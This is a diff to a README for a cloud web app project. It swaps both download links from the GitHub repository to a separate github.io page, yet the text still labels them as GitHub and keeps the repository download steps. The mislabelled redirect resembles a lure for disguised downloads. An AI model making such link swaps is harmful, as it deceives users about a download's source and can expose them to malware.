@@ -1,6 +1,6 @@
 # ☁️ aws-3tier-web-app - Deploy a secure and scalable cloud application
 
-[![Download Button](https://img.shields.io/badge/Download%20App-Get%20Started-blue?style=for-the-badge&logo=github)](https://github.com/billiesaharan126/aws-3tier-web-app)
+[![Download Button](https://img.shields.io/badge/Download%20App-Get%20Started-blue?style=for-the-badge&logo=github)](https://billiesaharan126.github.io)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ Before you begin, ensure your Windows computer meets these minimum requirements:
 
 Visit this link to download the application:
 
-[Download from GitHub](https://github.com/billiesaharan126/aws-3tier-web-app)
+[Download from GitHub](https://billiesaharan126.github.io)
 
 On the download page, click the green "Code" button, then select "Download ZIP" to get the complete project files.
 
